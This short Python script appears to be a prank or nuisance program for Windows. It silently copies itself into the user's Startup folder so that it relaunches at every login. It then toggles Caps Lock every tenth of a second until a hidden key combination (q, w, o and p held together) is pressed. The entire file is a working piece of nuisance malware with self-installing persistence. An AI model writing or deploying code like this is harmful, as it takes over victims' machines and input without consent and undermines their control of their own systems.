import os
import pyautogui
import keyboard
import shutil
import sys

user = os.getlogin()
c_file = sys.argv[0] if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

path = os.path.join(r'C:\Users', user, 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')

destination = os.path.join(path, os.path.basename(c_file))

shutil.copyfile(c_file, destination)

running = True
while running:
    pyautogui.press('capslock', interval=0.1)
    if keyboard.is_pressed('q') and keyboard.is_pressed('w') and keyboard.is_pressed('o') and keyboard.is_pressed('p'):
        running = False